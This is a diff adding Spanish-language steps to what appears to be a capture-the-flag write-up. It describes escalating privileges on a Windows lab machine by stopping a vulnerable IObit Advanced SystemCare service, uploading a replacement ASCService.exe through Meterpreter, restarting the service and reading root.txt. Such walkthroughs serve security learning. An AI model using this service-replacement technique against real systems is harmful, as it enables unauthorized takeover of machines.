@@ -264,4 +264,43 @@ En la otra terminal, donde tengo la background session y el exploit de multi han
 - exploit -j
 ![image](https://user-images.githubusercontent.com/44788583/149714400-2405f1f6-651c-46bf-b526-1f370e690d0e.png)
 - sessions -i 1 (para interactuar con la sesión)
+
+El path en el que está nuestro ejecutable vulnerable es: C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+- cd C:\Program Files (x86)\IObit\Advanced SystemCare\
+  no jaló :(
+- cd /     para irnos al mero inicio
+- cd Program\ Files\ (x86)
+- cd IObit
+- cd Advanced\ SystemCare
+ ![image](https://user-images.githubusercontent.com/44788583/149715885-51ff0f88-a174-40a6-8527-17bb606ab06f.png)
+
+--------
  
+### Deteniendo el servicio vulnerable
+- shell (dentro de la carpeta de Advanced SystemCare)
+- sc stop AdvancedSystemCareService9
+![image](https://user-images.githubusercontent.com/44788583/149716353-e3d6afb6-9756-424f-8346-fac7cf0d8f1e.png)
+  
+-----
+  
+### Subiendo ASCService.exe de nuestra máquina
+![image](https://user-images.githubusercontent.com/44788583/149716519-f61bd621-3fc5-46d3-a2ac-22ccd2921483.png)
+- upload /root/ASCService.exe
+![image](https://user-images.githubusercontent.com/44788583/149716765-17d507c9-1035-4fca-9461-59c83493b0e2.png)
+- shell
+- sc start AdvancedSystemCareService9
+![image](https://user-images.githubusercontent.com/44788583/149717301-88d6f49b-435f-4ce7-b7b8-a028453dc79b.png)
+Se pone como background la sesión 1
+- background
+- sessions -i 2 (para interactuar con la sesion 2)
+En la nueva sesión: 
+- cd /        para irnos hasta el folder principal
+- cd /Users/Administrator/Desktop
+- cat root.txt 
+  no jala ese comando
+- more root.txt
+ ![image](https://user-images.githubusercontent.com/44788583/149718036-ec576488-98b8-40a7-bd1c-b18e1001c791.png)
+
+
+![image](https://user-images.githubusercontent.com/44788583/149717570-cbbe765e-649a-4061-a130-b0e9bc353ca1.png)
+
